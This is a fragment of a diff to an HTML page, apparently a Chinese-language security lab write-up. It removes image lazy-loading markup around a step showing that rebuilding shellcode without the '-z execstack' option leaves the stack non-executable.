 </li>
 <li><p>进入<code>shellcode</code>文件夹，编辑<code>Makefile</code>文件，删除<code>-z execstack</code>选项；</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095653525.png" srcset="/img/loading.gif" lazyload>重新make一下：</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095659165.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095653525.png">重新make一下：</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095659165.png"></p>
 </li>
 <li><p>两个输出都无法正常输出：</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095704277.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095704277.png"></p>
 <p>说明栈不可执行！</p>
 </li>
 </ol>
@@ -961,10 +961,6 @@
 
 
 
-
-  
-    <script  src="/js/img-lazyload.js" ></script>
-  
 
 
 
